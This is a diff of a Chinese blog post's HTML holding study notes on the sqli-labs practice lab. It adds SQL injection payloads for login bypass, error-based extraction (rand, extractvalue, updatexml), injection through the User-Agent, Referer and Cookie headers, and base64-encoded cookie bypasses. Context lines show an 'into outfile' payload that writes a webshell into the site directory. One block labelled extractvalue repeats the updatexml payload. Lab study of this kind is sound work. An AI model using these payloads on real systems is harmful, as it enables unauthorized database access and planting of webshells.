@@ -21,7 +21,7 @@
 <meta property="og:url" content="https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/index.html">
 <meta property="og:site_name" content="Isron">
 <meta property="og:description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
-<meta property="og:updated_time" content="2016-10-25T14:02:42.079Z">
+<meta property="og:updated_time" content="2016-10-26T05:23:19.440Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs学习笔记总结">
 <meta name="twitter:description" content="本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧">
@@ -352,8 +352,38 @@ into outfile ‘目标文件’ [option];
 </code></pre><p>主要payload：</p>
 <pre><code>http://127.0.0.1/Less-7/?id=1&apos;))union select 1,2,3 into outfile &apos;D:/wamp/www/Less-7/1.txt&apos; --+  //在绝对路径生成一个1.txt文件
 http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/www/Less-7/1.jpg&apos;),3 into outfile &apos;D:/wamp/www/Less-7/1.php&apos; --+  //将一句话木马上传到网站目录上
-</code></pre><h2 id="sqli-less-8，9"><a href="#sqli-less-8，9" class="headerlink" title="sqli-less-8，9"></a>sqli-less-8，9</h2><p>盲注<a href="https://clearloveqaq.github.io/2016/09/22/sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="SQL盲注">https://clearloveqaq.github.io/2016/09/22/sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
-
+</code></pre><h2 id="sqli-less-8，9，10，15-16"><a href="#sqli-less-8，9，10，15-16" class="headerlink" title="sqli-less-8，9，10，15,16"></a>sqli-less-8，9，10，15,16</h2><p>盲注<a href="https://clearloveqaq.github.io/2016/09/22/sql%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">之前的盲注笔记</a></p>
+<h2 id="sqli-less-11，12"><a href="#sqli-less-11，12" class="headerlink" title="sqli-less-11，12"></a>sqli-less-11，12</h2><p>post传参注入<br>常见的万能密码：<br>    or 1=1 #<br>    ‘or’=’or’<br>主要payload：</p>
+<pre><code>uname=111&apos; or 1=1 #&amp;passwd=111&amp;submit=Submit  //成功登陆 可以添加一个limit函数 获取其他的name password 然后可以在111’后构建攻击代码
+</code></pre><h2 id="sqli-less-13，14"><a href="#sqli-less-13，14" class="headerlink" title="sqli-less-13，14"></a>sqli-less-13，14</h2><p>基于错误的post型注入</p>
+<h2 id="sqli-less-17"><a href="#sqli-less-17" class="headerlink" title="sqli-less-17"></a>sqli-less-17</h2><p>密码重置注入<br>update语句：</p>
+<pre><code>作用：用于修改表中的数据
+语法： update 表名称 set 列名称 = 新值 where 列名称 = 某值
+例句： update users set password= &apos;Dumb&apos; where username = &apos;Dumb&apos;; 修改users表中Dumb的密码。
+其中“set 列名称 = 新值” 新值可以为逻辑运算的结果（True or False）
+</code></pre><p>password型的基于错误的注入<br>主要payload：<br>rand随机数型：</p>
+<pre><code>uname=admin&amp;passwd=&apos; or (select * from (select count(*),concat(0x3a,database(),0x3a,floor(rand()*2))a from information_schema.tables group by a)b)# &amp;submit=Submit
+</code></pre><p>extractvalue型：</p>
+<pre><code>uname=admin&amp;passwd=&apos; or (updatexml(1,concat(0x3a,(select database()),0x3a),1)) #&amp;submit=Submit
+</code></pre><p>updatexml型：</p>
+<pre><code>uname=admin&amp;passwd=&apos; or (updatexml(1,concat(0x3a,(select database()),0x3a),1)) #&amp;submit=Submit
+</code></pre><h2 id="sqli-less-18"><a href="#sqli-less-18" class="headerlink" title="sqli-less-18"></a>sqli-less-18</h2><p>insert 语句：</p>
+<pre><code>作用：insert into 用于向表格中插入新的行
+语法：insert into 表名称 values（值1，值2，......）
+例句：insert into users values(15,&apos;aaaa&apos;,&apos;aaaa&apos;); 向users表中插入新的数据
+注： insert与update一样  values可以插入逻辑运算结果
+</code></pre><p>利用user-agent进行基于错误的注入：<br>主要payload：</p>
+<pre><code>User-Agent:&apos;,extractvalue (1,concat(0x3a,(select database()),0x3a)))#
+</code></pre><h2 id="sqli-less-19"><a href="#sqli-less-19" class="headerlink" title="sqli-less-19"></a>sqli-less-19</h2><p>利用referer进行基于错误的注入<br>主要payload：</p>
+<pre><code>Referer: 1&apos;,extractvalue(1, concat(0x7e, (select database()),0x7e))) #
+</code></pre><h2 id="sqli-less-20-21，22"><a href="#sqli-less-20-21，22" class="headerlink" title="sqli-less-20,21，22"></a>sqli-less-20,21，22</h2><p>利用cookie进行注入<br>主要payload：</p>
+<pre><code>Cookie: uname=1&apos; union select 1,database(),@@version #   //less20
+Cookie:uname=MScpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksQEB2ZXJzaW9uICM=   //less21 进行编码绕过
+Cookie: uname=MSIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSxAQHZlcnNpb24gIw==
+</code></pre><h2 id="sqli-less-23-37"><a href="#sqli-less-23-37" class="headerlink" title="sqli-less-23-37"></a>sqli-less-23-37</h2><p>基于waf的Get型注入 <a href="https://clearloveqaq.github.io/2016/10/15/sql%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">sql绕过技巧</a></p>
+<h2 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h2><pre><code>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。
+如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。
+</code></pre>
       
     </div>
     
@@ -364,7 +394,7 @@ http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/ww
         <p><span>本文标题:</span><a href="/2016/10/25/sqli-labs学习笔记总结/">sqli-labs学习笔记总结</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
         <p><span>发布时间:</span>2016-10-25, 21:42:36</p>
-        <p><span>最后更新:</span>2016-10-25, 22:02:42</p>
+        <p><span>最后更新:</span>2016-10-26, 13:23:19</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/10/25/sqli-labs学习笔记总结/" title="sqli-labs学习笔记总结">https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/</a>
             <span class="copy-path" data-clipboard-text="原文: https://clearloveqaq.github.io/2016/10/25/sqli-labs学习笔记总结/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -394,7 +424,7 @@ http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/ww
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-less-1-2-3，4"><span class="toc-number">1.</span> <span class="toc-text">Sqli-less-1,2,3，4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-less-5，6"><span class="toc-number">2.</span> <span class="toc-text">Sqli-less-5，6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-7"><span class="toc-number">3.</span> <span class="toc-text">sqli-less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-8，9"><span class="toc-number">4.</span> <span class="toc-text">sqli-less-8，9</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-less-1-2-3，4"><span class="toc-number">1.</span> <span class="toc-text">Sqli-less-1,2,3，4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-less-5，6"><span class="toc-number">2.</span> <span class="toc-text">Sqli-less-5，6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-7"><span class="toc-number">3.</span> <span class="toc-text">sqli-less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-8，9，10，15-16"><span class="toc-number">4.</span> <span class="toc-text">sqli-less-8，9，10，15,16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-11，12"><span class="toc-number">5.</span> <span class="toc-text">sqli-less-11，12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-13，14"><span class="toc-number">6.</span> <span class="toc-text">sqli-less-13，14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-17"><span class="toc-number">7.</span> <span class="toc-text">sqli-less-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-18"><span class="toc-number">8.</span> <span class="toc-text">sqli-less-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-19"><span class="toc-number">9.</span> <span class="toc-text">sqli-less-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-20-21，22"><span class="toc-number">10.</span> <span class="toc-text">sqli-less-20,21，22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-less-23-37"><span class="toc-number">11.</span> <span class="toc-text">sqli-less-23-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Session机制"><span class="toc-number">12.</span> <span class="toc-text">Session机制</span></a></li></ol>
         
     </div>
     <style>
